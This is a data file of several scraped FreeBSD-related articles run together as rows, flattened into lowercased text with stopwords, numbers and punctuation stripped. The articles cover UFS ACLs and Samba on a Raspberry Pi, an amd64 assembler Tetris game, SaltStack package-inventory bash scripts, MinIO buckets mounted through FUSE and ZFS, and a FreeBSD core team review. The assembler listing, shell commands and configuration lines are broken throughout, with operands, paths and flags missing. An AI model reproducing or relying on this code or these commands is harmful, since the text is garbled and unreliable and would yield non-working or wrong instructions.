kernel console uboot currdev interpret ok kernel kernel kernelname bootkernelkernel loaddev loaderconffiles bootloaderconf bootloaderconflocal modulepath bootkernel bootkernel bootmodules bootdtb prompt loader twiddledivisor vfsrootmountfrom ufs vfsrootmountfromoptions rw noatime acls tried creating new file bootloaderconflocal content vfsrootmountfromoptions rw acls noatime added option kernel environment desired effect file system could interactively modified mount grep vartmp vartmp ufs local noatime softupdates acls mount u noatime noacls vartmp mount grep vartmp vartmp ufs local noatime softupdates mount u noatime acls vartmp vartmp ufs local noatime softupdates acls root file system mount command change option ran error warning message exited status however attribute change mount grep ufs local noatime journaled softupdates mount u noatime acls echo mount grep ufs local noatime journaled softupdates problem root file system raspberry pi image set always use option acls acls use posix acls enabled explained freebsd access control list page mounttime flag set persistent manner modifying flag superblock file system header flag set used modified without unmounting file system unmount root file system page explains security want mark file system precisely reason unable proceed intruder gain root access disable acl protection acls enforced within superblock prevent user otherwise unlimited power modifying protected component file system agree logic analogous reason linux able disable securityenhanced linux protection kernel running forced reboot system disable boot time requiring physical access console notice red hat chooses build kernel allow changed run time decreasing security making easy help customer solve problem kernel build configuration variable securityselinuxdisable mean disabled running kernel build configuration interface security option nsa selinux support nsa selinux runtime disable building linux kernel samba requires posix acls part database maintained us acls part persistent file system varlog vartmp tmp based ram md pseudodevice root file system modified tunefs tool job typical server hardware could reboot request boot singleuser maintenance mode could boot medium neither possible plugged hdmi cable tv plugged usb keyboard rebooted problem early boot environment nt see usb keyboard could nt send key stop automated boot ask boot singleuser mode manually shut network service using lsof see remained manually unmounted bootmsdos varlog vartmp tmp file system manually terminated process could getty process respawn finally forced change readwrite readonly sync sync sync mount f u ro could use tunefs disable acl enable flag file system dumpfs verify worked dumpfs grep flag flag softupdatesjournal tunefs n disable tunefs acls cleared tunefs filesystem reloaded tunefs enable tunefs posix acls set tunefs filesystem reloaded dumpfs head magic time fri feb superblock location id ncg size block bsize shift mask fsize shift mask frag shift fsbtodb minfree optim time symlinklen maxbsize maxbpg maxcontig contigsumsize nbfree ndir nifree nffree bpg fpg ipg unrefs nindir inopb maxfilesize sbsize cgsize csaddr cssize sblkno cblkno iblkno dblkno cgrotor fmod ronly clean metaspace avgfpdir avgfilesize flag softupdatesjournal acls fsmnt volname swuid providersize c c nbfree ndir nifree nffree tunefs p tunefs acls enabled tunefs acls n disabled tunefs mac multilabel l disabled tunefs soft update n enabled tunefs soft update journaling j enabled tunefs gjournal j disabled tunefs trim disabled tunefs maximum block per file cylinder group e tunefs average file size f tunefs average number file directory tunefs minimum percentage free space tunefs space hold metadata block k tunefs optimization preference time tunefs volume label l soft update mechanism drastically improves file system performance buffer metadata update memory cache detail available freebsd disk tuning page adding samba bind ran space tmp initial package updating umounted let use root partition end nt anything left tmp need clean remounting later ran space pkg search commented line etcfstab defining tmp mb space tmp nt enough rambased memory device faster limited size could make larger ram already limited platform nt package literally named samba bind named package available different version version number name pkg search bindnamedsamba command line tool bind delv dig host nslookup bind dns suite updated dnssec bind dns suite updated dnssec bind dns suite updated dnssec bind dns suite updated dnssec rrdtool frontend bind statistic test bind semantics socket nsupdate utility gsstsig support onaccess antivirus filter samba free smb cifs client server unix shared lib samba package netbios name lookup tool samba ftplike client free smbcifs addc server client unix free smbcifs addc server client unix ok package bind called bind named package management bsd linux solaris initially installed bind samba went everything follows found samba support bind samba us dynamically loadable zone dlz accessed ad schema must compatible combination bind samba information samba page bind dlz dns back end bind version supported starting bind samba bind samba bind samba bind samba let install latest available version samba latest available compatible version bind pkg install updating freebsd repository catalogue freebsd repository uptodate repository uptodate following package affected checked new package installed package deleted number package installed process require mib space mib downloaded proceed action yn fetching mib fetching mib fetching kib package deleted many installation deleted openldap client package successfully installed edit usrlocaletcopenldapldapconf change systemwide client default try man ldapconf visit openldap faqomatic http wwwopenldaporgfaqindexcgi information installation deleted message bind requires configuration rndc including secret key easiest secure way configure rndc run rndcconfgen generate proper conf file new random key appropriate file permission usrlocaletcrcdnamed script installation deleted message start http configuration relevant database log provisioning script usrlocalbinsambatool additional documentation check http key bind automatically generated first time started key stored usrlocaletcnamedbrncdkey use control bind program rndc probably use script usrlocaletcrcdnamed run argument see choice parameter start stop restart reload status cover need also added lsof vim next step next step turn new freebsd system slave dns server raspberry pi running freebsd bind samba software installed linux topic
37,Lobsters,freebsd,FreeBSD,FreeBSD 64bit Assembler (amd64),https://honeyguide.eu/posts/asm64-fbsd/,freebsd assembler,,freebsd many assembler example available web virtually none little bit complex joke aside example show set assembler program us c runtime function also link additional library available portspackages note keyboard handling could smoother would require change go beyond scope small showcase abi freebsd follows aspect linux abi frequently work linux example tutorial mean parameter library function passed order exluding float build program little shell script us system compiler llvm link needed library note svgalibprograms need run root frame parameter frameheight equ framewidth equ frameborderwidth equ framebeginningx equ framebeginningy equ nextpieceframeheight equ nextpieceframewidth equ nextpieceframeborderwidth equ nextpieceframebeginningx equ nextpieceframebeginningy equ boardcolor equ piecesize equ scoreposx equ scoreposy equ gameoverposx equ gameoverposy equ waitfactor usleepms approx usleepms long miss keyboard input short keypresses counted several time waitfactor equ usleepms equ section data gameover db game scorestring db score section bs boardstate resb nextpiecetype resb piecetype resb piececol resb piecepos resb piecepivotpos resb temporarypiecepos resb waittime resb score resw scoreasstring resb extern glwrite glsetfont glsetfontcolors glsetwritemode vgainit vgasetmode vgasetcolor glfillbox glsetcontextvga vgagetkey usleep rand extern exit keyboardinit keyboardtranslatekeys keyboardupdate keyboardkeypressed keyboardclose section text global main main initialization sub call vgainit mov rdi svgalib see vgah call vgasetmode mov rdi need init vgagl mode call glsetcontextvga mov mov mov rdx call glsetfont see man glwrite mov call glsetwritemode mov rdi mov rsi call glsetfontcolors call keyboardinit mov rdi call drawframe call drawnextpieceframe jmp gameinprogres endofgame call delayforlongwhile call displaygameover call delayforlongwhile return previous video mode call keyboardclose mov rdi call vgasetmode finish program simply call return might called within gameinprogress mov rdi call exit drawing function draw rectangle rax begin point rcx height rbx width rdi color drawrect xor rdx rdx clear dx ax division push rdi save colour push rcx save height later mov rcx divisor cx div cx divide begin get ax x dx remainder mov rdi rdx param mov rsi rax param mov rdx rbx width param pop rcx height param fetch stack pop pas colour call glfillbox mov rdi restore colour ret drawframe mov rdi colour gora mov rax framebeginningy framebeginningx mov rcx frameborderwidth mov rbx framewidth frameborderwidth call drawrect lewa mov rax framebeginningy frameborderwidth framebeginningx mov rcx frameheight mov rbx frameborderwidth call drawrect prawa mov rax framebeginningy frameborderwidth framebeginningx framewidth frameborderwidth mov rcx frameheight mov rbx frameborderwidth call drawrect dol mov rax framebeginningy frameheight frameborderwidth framebeginningx mov rcx frameborderwidth mov rbx framewidth frameborderwidth call drawrect ret drawnextpieceframe mov rdi gora mov rax nextpieceframebeginningy nextpieceframebeginningx mov rcx nextpieceframeborderwidth mov rbx nextpieceframewidth nextpieceframeborderwidth call drawrect lewa mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx mov rcx nextpieceframeheight mov rbx nextpieceframeborderwidth call drawrect prawa mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx nextpieceframewidth nextpieceframeborderwidth mov rcx nextpieceframeheight mov rbx nextpieceframeborderwidth call drawrect dol mov rax nextpieceframebeginningy nextpieceframeheight nextpieceframeborderwidth nextpieceframebeginningx mov rcx nextpieceframeborderwidth mov rbx nextpieceframewidth nextpieceframeborderwidth call drawrect ret drawboardstate mov rbx dec rbx push rbx movzx rdi byte boardstate rbx mov rax rbx call drawonesquare pop rbx cmp rbx jne ret clearboard mov rax framebeginningy frameborderwidth framebeginningx frameborderwidth mov rcx frameheight mov rbx framewidth mov rdi boardcolor call drawrect ret drawtetromino movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare ret rax piecenumber rdi color drawonesquare mov bl div bl ah x al mov cx ax calculate offset mov al cl xor ah ah mov bx piecesize mul bx push rax calculate x offset mov al ch xor ah ah mov bx piecesize mul bx pop rdx move fit frame add ax dx add ax framebeginningy frameborderwidth framebeginningx frameborderwidth mov bx piecesize mov cx piecesize jmp drawrect game function gameinprogres mov byte waittime waitfactor call generatenextpiecenumber placenext call updateboard call generatenextpiece call generatenextpiecenumber call setnewdelay call writescore jmp checkifnotend pieceinprogress call clearboard call drawboardstate call drawtetromino call scoretostring call getplayerinput cmp ax ax ffff place next piece cmp ax je placenext call moveonedown cmp ax je placenext jmp pieceinprogress checkifnotend movzx rbx byte piecepos mov al boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame jmp pieceinprogress getplayerinput movzx rcx byte waittime waitforkey dec cx cmp cx je noinput need run loop frequent polling check every second keyboard pressed miss key event keyboardupdate svgalib push rcx need save loop counter across svgalib call various pushpops superelegant yes know call delayforwhile need ensure nt call frequently otherwise keypress returned call keyboardupdate pop rcx mov rdi scancodecursorleft push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneleft mov rdi scancodecursorblockleft push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneleft mov rdi scancodecursorsdown push rcx call keyboardkeypressed pop rcx cmp rax jne downkey mov rdi scancodecursorblockdown push rcx call keyboardkeypressed pop rcx cmp rax jne downkey mov rdi scancodecursorright push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneright mov rdi scancodecursorblockright push rcx call keyboardkeypressed pop rcx cmp rax jne moveoneright mov rdi scancodecursorup push rcx call keyboardkeypressed pop rcx cmp rax jne rotatecounterclockwise mov rdi scancodecursorblockup push rcx call keyboardkeypressed pop rcx cmp rax jne rotatecounterclockwise mov rdi push rcx call keyboardkeypressed pop rcx cmp rax jne rotateclockwise mov rdi scancodeescape push rcx call keyboardkeypressed pop rcx cmp rax jne endofgame jmp waitforkey noinput xor rax rax ret downkey inc word score call moveonedown xor rax rax ret generatenextpiecenumber mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx nextpieceframeborderwidth mov rcx nextpieceframeheight mov rbx nextpieceframewidth mov rdi boardcolor call drawrect random next piece call rand xor dx dx mov cx div cx mov byte nextpiecetype dl mov ah dl do code expects next piece type ah genfirstpiece cmp ah jne gensecondpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret gensecondpiece j cmp ah jne genthirdpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genthirdpiece l cmp ah jne genforthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genforthpiece cmp ah jne genfifthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genfifthpiece cmp ah jne gensixthpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret gensixthpiece cmp ah jne genseventhpiece mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret genseventhpiece z mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect mov rax nextpieceframebeginningy nextpieceframeborderwidth piecesize nextpieceframebeginningx nextpieceframeborderwidth piecesize mov rcx piecesize mov rbx piecesize mov rdi call drawrect ret generatenextpiece mov ah byte nextpiecetype mov byte piecetype ah mov byte piecepivotpos firstpiece cmp ah jne secondpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret secondpiece j cmp ah jne thirdpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret thirdpiece l cmp ah jne forthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret forthpiece cmp ah jne fifthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret fifthpiece cmp ah jne sixthpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret sixthpiece cmp ah jne seventhpiece mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret seventhpiece z mov byte piecepos mov byte piecepos mov byte piecepos mov byte piecepos mov byte piececol ret solidifypiece movzx rbx byte piecepos mov al byte piececol mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al movzx rbx byte piecepos mov byte boardstate rbx al ret updateboard mov dl updateboardloop dec dl call clearonerow cmp dl jne updateboardloop ret clearonerow dl row clear mov bl mov al dl mul bl xor rbx rbx mov bx ax mov cx cmp byte boardstate rbx boardcolor je notclearonerow inc bx loop add word score cmp dl je notclearonerow push rdx dec dl call moverowdown cmp dl jne pop rdx jmp clearonerow notclearonerow ret moverowdown dl beginrow mov bl mov al dl mul bl xor rbx rbx mov bx ax mov cx moverowdownloop mov al byte boardstate rbx mov byte boardstate rbx al mov byte boardstate rbx boardcolor inc bx loop moverowdownloop ret moveonedown xor rax rax mov rbx xor dl dl check frame collision cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown cmp byte piecepos jae cantmoveonedown check space collsion xor rbx rbx mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown mov bl byte piecepos add bl cmp byte boardstate rbx boardcolor jne cantmoveonedown add byte piecepos add byte piecepos add byte piecepos add byte piecepos add byte piecepivotpos xor rax rax ret cantmoveonedown call solidifypiece mov rax ret moveoneleft mov bl check frame collision xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneleft check space collsion xor rbx rbx mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft mov bl byte piecepos dec bl cmp byte boardstate rbx boardcolor jne cantmoveoneleft dec byte piecepos dec byte piecepos dec byte piecepos dec byte piecepos dec byte piecepivotpos cantmoveoneleft xor ax ax ret moveoneright mov bl check frame collision xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright xor ax ax mov al byte piecepos div bl cmp ah je cantmoveoneright check space collsion xor rbx rbx mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright mov bl byte piecepos inc bl cmp byte boardstate rbx boardcolor jne cantmoveoneright inc byte piecepos inc byte piecepos inc byte piecepos inc byte piecepos inc byte piecepivotpos cantmoveoneright ret rotateclockwise checkboard mov rbx dec bx push rbx xor ax ax mov bl mov al byte piecepivotpos div bl pop rbx cmp ah jb cantrotateclockwise cmp ah ja cantrotateclockwise cmp al ja cantrotateclockwise mov cx ax xor ax ax mov al byte piecepos rbx push rbx mov bl sub al byte piecepivotpos div bl mov dx ax ah x al mov ah dl cmp byte piecetype je rotateclockwisespc mov al rotateclockwisespcback sub al dh mov dx ax mov al dl mov bl mul bl add al dh pop rbx add al byte piecepivotpos mov byte temporarypiecepos rbx al cmp bx jne xor rbx rbx mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov bl byte temporarypiecepos cmp byte boardstate rbx boardcolor jne cantrotateclockwise mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al cantrotateclockwise xor ax ax ret rotateclockwisespc mov al jmp rotateclockwisespcback rotatecounterclockwise checkboard mov rbx dec bx push rbx xor ax ax mov bl mov al byte piecepivotpos div bl pop rbx cmp ah jb cantrotatecounterclockwise cmp ah ja cantrotatecounterclockwise cmp al ja cantrotatecounterclockwise mov cx ax xor ax ax mov al byte piecepos rbx push rbx mov bl sub al byte piecepivotpos div bl mov dx ax ah x al mov al dh cmp byte piecetype je rotatecounterclockwisespc mov ah rotatecounterclockwisespcback sub ah dl mov dx ax mov al dl mov bl mul bl add al dh pop rbx add al byte piecepivotpos mov byte temporarypiecepos rbx al cmp bx jne xor bx bx movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise movzx byte temporarypiecepos cmp byte boardstate boardcolor jne cantrotatecounterclockwise mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al mov al byte temporarypiecepos mov byte piecepos al cantrotatecounterclockwise xor ax ax ret rotatecounterclockwisespc mov ah jmp rotatecounterclockwisespcback delay second loop input time delayforwhile mov rdi usleepms call usleep ret delayforlongwhile mov rdi call usleep ret setnewdelay cmp byte waittime jb nosetnewdelat mov ax word score xor dx dx mov bx div bx mov dx ax mov ax cmp ax dx jl sub ax dx mov byte waittime al nosetnewdelat ret mov byte waittime ret scoretostring xor dx dx mov ax word score mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al mov ax dx xor dx dx mov bx div bx add ax mov byte scoreasstring al add dx mov byte scoreasstring dl mov byte scoreasstring c string end mov bx mov dl mov rdi scoreposx mov rsi mov rdx scorestring call glwrite mov rdi scoreposx x position mov rsi scoreposy position mov rdx scoreasstring position string character call glwrite ret writescore mov rdi scoreposx mov rsi mov rdx scorestring call glwrite mov rdi scoreposx x position mov rsi scoreposy position mov rdx scoreasstring position string character call glwrite ret displaygameover xor rax rax mov rcx mov rbx mov rdi boardcolor call drawrect mov rdi gameoverposx x position mov rsi gameoverposy position mov rdx gameover position string character call glwrite ret
38,Lobsters,freebsd,FreeBSD,Software Inventory with Salt on FreeBSD,https://blog.socruel.nu/freebsd/software-inventory-with-salt-on-freebsd.html,software inventory salt freebsd,software inventory salt freebsd introduction ci control ci control freebsd saltstack saltstack pkg module freebsd software package salt minion saltstack freebsd saltstack freebsd series basic explained saltstack freebsd freebsd freebsd package salt pkg module package salt master salt salt minion salt json json json jq freebsd port jq freebsd salt minion inventory script bash bash freebsd port query host package package bash bash query package installed somewhere freshports bash bash wrap salt pkg module saltstack saltstack operating system freebsd openbsd linux ocs inventory freebsd freebsd port resource,software inventory salt freebsd introduction software inventory one ci control ci control provide prioritized cybersecurity best practice recommended set action cyber defense provide specific actionable way stop today pervasive dangerous attack recently software inventory control socruelnu platform platform almost completely based freebsd host physical virtual laptop managed saltstack would nice used purpose saltstack pkg module manage control freebsd software package running salt minion post requires setup saltstack freebsd information see saltstack freebsd series post basic explained saltstack pkg module freebsd documented please aware old documentation freebsd use pkg instead pkgng calling module inventory software running freebsd system list package installed system using salt pkg module calling listpkgs option list package system called minionintradomaintld run command salt master sudo salt minionintradomaintld pkglistpkgs salt also possible call multiple system salt minion sudo salt domaintld pkglistpkgs output command really structured wait salt support json format output utilize use option sudo salt intradomaintld pkglistpkgs outjson json output queried lighweight flexible commandline json processor jq available freebsd port install jq use command sudo pkg install jq needed ingredient able software inventory freebsd based salt minion inventory script code chapter written bash bash also available freebsd port installed easily sudo pkg install bash query host package first requirement able query host host see package installed particular host host format output nice way done based basic described bash code call script sish need host queried input like ie sudo sish sudo sish intranetdomaintld first state use bash declare program variable tool need usrbinenv bash command varsalt usrlocalbinsalt varsed usrbinsed varcat bincat vartee usrbintee vartouch usrbintouch vargrep usrbingrep varwc usrbinwc varchmod binchmod varrm binrm rf varjq usrlocalbinjq next declare exit state exit state write main part script varhostsoutfile tmphostsout varrm varhostsoutfile devnull vartouch varhostsoutfile varchmod varhostsoutfile varhosts z input echo function requires hostame input ie tst intranetdomaintld exit varstatewarning else echo package installed varhosts vartee varhostsoutfile echo vartee varhostsoutfile varsalt varhosts pkglistpkgs outjson static varsed varsed varsed varsed g varsed varsed retcoded vartee varhostsoutfile fi line code first line create output file tmphostsout line declares variable varhosts taken input parameter line define else fi statement line check input parameter exists line state happens input parameter exist line state happens input parameter exist happens line echo text standard output output file tmphostsout line echo blank line standard output output file tmphostsout make output nicer line salt command query varhosts package output made nicer couple sed command copied standard output output file tmphostsout output look like sudo sish testintranetdomaintld package installed testintranetdomaintld testintranetdomaintld carootnss curl entr expat fping gdbm gettextruntime gmp gnuls indexinfo libev libffi libiconv libinotify libmaxminddb lowdown minio minioclient nagioscheckports nagiosplugins netsnmp nginx norm openpgm openssl pcre pkg portmaster readline rsync sudo query package installed somewhere often find eg freshports certain package vulnerability nice know quickly host package running second requirement basic discussed bash code call script sish need host want query well package name queried input like ie sudo sish testintranetdomaintld sudo sish domaintld vimconsole first state use bash declare program variable tool need usrbinenv bash command varsalt usrlocalbinsalt varsed usrbinsed varcat bincat vartee usrbintee vartouch usrbintouch vargrep usrbingrep varwc usrbinwc varchmod binchmod varrm binrm rf varjq usrlocalbinjq next declare exit state exit state write main part script varpackageoutfile tmppackageout varrm varpackageoutfile devnull vartouch varpackageoutfile varchmod varpackageoutfile varliveserversoutfile tmpliveserversout varrm varliveserversoutfile devnull vartouch varliveserversoutfile varchmod varliveserversoutfile varhosts varpackage z echo option requires hostname argument ie testintranetdomaintld domaintld exit varstatewarning else z echo option requires package name argument ie exit varstatewarning else varsalt varhosts testping outjson grep true varsed strue g varsed g varsed g varsed g varsed varliveserversoutfile echo package varpackage installed vartee varpackageoutfile echo vartee varpackageoutfile varcat varliveserversoutfile read varservername varpackageversion varsalt varservername pkglistpkgs outjson static varjq varjq arg k varpackage k varpackageversion null echo varservername vartee varpackageoutfile fi done fi fi varrm varliveserversoutfile check host actually live moment issue script line varsalt varhosts testping outjson grep true varsed strue g varsed g varsed g varsed g varsed varliveserversoutfile host live put file varliveserversoutfile file read line line done loop line host checked given package installed varpackageversion varsalt varservername pkglistpkgs outjson static varjq varjq arg k varpackage k varpackageversion null echo varservername vartee varpackageoutfile fi example output script action query package vmbhyve look like sudo sish intranetdomaintld vmbhyve package vmbhyve installed wrap done example salt pkg module option capability one shown module eg also audit option query installed package known vulnerability left reader fill one much like query actual situation host script explained provides situation find powerfull script documented however provide historical information andor nice web interface could export saltstack query text file even database saltstack pkg module operating system independent mixed environment freebsd openbsd even linux based distibutions would al work nicely bare basic solution fit need need comprehensive software inventory solution including web interface application please take look ocs inventory fully supported freebsd available freebsd port might implement one day resource resource subject updated july
39,Lobsters,freebsd,FreeBSD,ZFS High Availability Filesystem with Minio on FreeBSD,https://honeyguide.eu/posts/minio-fuse/,zfs high availability filesystem minio freebsd,introduction minio separate post already value previous post explaining set minio fusefs credential preparation mount bucket filesystem bucket raw device zfs,introduction minio wellknown compatible object storage platform support high availability scalability feature easy configure separate post already describing set minio freebsd post explains use minio storage platform provide ha filesystems freebsd describe two way mount bucket file system freebsd pkg install pkg install filesystem like zfs ffs top provides direct access bucket content relatively slow mounted many node time though bucket block device use file system like zfs top appropriately configured caching fast since transaction asynchronous since zpool file system mounted one host time suitable eg ha storage container jail run different host parallel eg failover scenario filesystem bucket unmounted remounted another host via network quickly course network drive also mounted eg via nfs minio storage layer provides scale high availability feature easily replicated nfs file server na system following step use value previous post explaining set minio fusefs credential preparation ensure fusefsbased filesystems run freebsd need add fuse bootloaderconf echo fuseload yes bootloaderconf either reboot load module first time hand kldload fuse also need access key create file containing login credential minio setup echo myaccesskey mysecretkey mount bucket filesystem install file system driver pkg install create mount point eg bucket want mount case testbucket simply via minio web interface mount bucket already testbucket urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat get detailed description option via man want mount bucket automatically boot add following line etcfstab testbucket fuse rw netdev allowother late urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat bucket raw device zfs create filesystem like zfs inside bucket install pkg install use empty bucket called testbucket mount command line first assuming unmounted first listblocks testbucket baseurlhttps insecure command creates raw device also set cache size block let u create zpool zpool create atimeoff note file appended path used mounting bucket created imported simply running eg zpool import also mount block device via etcfstab fuse rw allowother late listblocks baseurlhttps insecure mounting block device etcfstab want mount zpool
40,Lobsters,freebsd,FreeBSD,FreeBSD Core Team 10 in Review,https://freebsdfoundation.org/blog/freebsd-core-team-10-in-review/,freebsd core team review,celebrating year democratic management freebsd preparing next working group structure email protected email protected email protected email protected email protected regular core report public quarterly report previous next,celebrating year democratic management freebsd preparing next core team ready take management freebsd project interviewed member core team observation productive two year democracy slow process stumbling right decision instead going straight forward wrong one anonymous year freebsd project elected group project committers serve twoyear term core team ct short active developer project eligible vote selfnominated candidate project website describes role core team follows freebsd core team constitutes project board director responsible deciding project overall goal direction well managing specific area freebsd project landscape concluded july made several process decision tackle perceived heavy workload decided burn retire old potentially unaddressable issue could focus current problem kicking old issue one core team next helping community one member put itthey established working group structure deputize people tackle big project notably first set motion imminent adoption git initiated annual community survey support datadriven decision makingthey increased cadence meeting adopted new ct communication collaboration mode notably ct switched using slack irc bridge google doc collaborating messaging following people served number represents time served core bold indicating represents consecutive term allan jude reuschling davis sato roberson john baldwin moore sean chittenden losh composition reflects balance new idea institutional knowledge contribute project steady innovation warner losh served first core team total six put way important mix people new idea asking people involved longer reflect thing done way balance protects allowing way thing done getting way improvement freebsd foundation interviewed several member understand made tick strategy team pursued successfully tackle challenging topic like migrating git updating coc emerges team focus collaboration transparency essential achieving much multiple member interviewed including served core observed team decision focus small number big initiative key representing opposite end new longserving spectrum jeff roberson john baldwin offered strikinglysimilar take importance prioritization figure early small set thing going drive completion said jeff john add stuff agenda instead pick one three big thing per term otherwise easy get spread thin make progress course focusing smaller set big project requires consensus onwhich thing pursue brings u one big initiative annual community survey echoing comment several member allan jude note annual user survey second round useful discover people using freebsd instance help u answer longdebated question like people actually want frequent release secretary joseph mingrone add community developer survey big step towards becoming datadriven transparent purpose focusing small number bigger project undertake jeff roberson found survey revealed nearly universal common theme lot common ground case member felt election provided mandate observing uncommon experience core john baldwin remarked rarely core come term mandate time coc clear mandate let unpack move git coc update understand operated forthcoming report git working group provide definitive rationale move general consensus interview conference talk lack git impediment attracting new developer project svn also make code collaboration difficult many member shared allan jude assessment latter dominant motivator git seen better collaboration tool need git add extra remote anywhere internet collaborate anyone even freebsd account make much easier collaborate svnbased system today git also allows create series commits move around unit rebase svn monolithic git also advantage ci take patch context formalized working group structure charter people undertake significant project fit neatly existing team notable instance wgs action git warner perspective git working group ed maste leading charge really work core provided oversight asking lot question turned good model git hard part figuring transition phase big leap sideways allows u continue innovate git add capability feature go community decision art politics art possible asked answered possible version revealing advantage engaged community mature use case brook davis shared cheri project work served excellent challenging use case smoke svn git migration issue kris moore also shared ixsystems changed truenas product subversion git community engagement code submission user increased freebsd pragmatic community perfect enemy good committing transition plan svn git agreed upon next logical step initial migration git core team expects future working group spring enhance developer community contribution experience significant portion community dissatisfied existing code conduct several interviewee observed one ct member put freebsd strives inclusive fair community coc sits heart goal way establish community norm interaction easy understand follow enforce others observed interpersonal issue tend dominate work core seemed particularly although kind work draining fact ct nine member ensures enough bench alleviate burn ct undertook thorough process researching project arrived current coc soliciting feedback community discussing desired end state agreeing project would best served tailoring existing fieldproven coc another project one member coc work felt like democracy action ct came community mandate address issue committed pursued transparent inclusive process followed time writing community process voting preferred coc among two option put forward ct working group structure said strategy much delegating work good process around accountability followthrough essential successful term ct formalized working group structure put action git wg allan jude offer take core tried improve process someone propose bigger idea get momentum similar python pip earlier effort around freebsd community proposal catch think put much burden person requesting change core adopted working group person group proposes wg person group creates charter operating plan core reviewsapproves proposal giving group implicit blessing pursue potentially disruptive change improve community seems 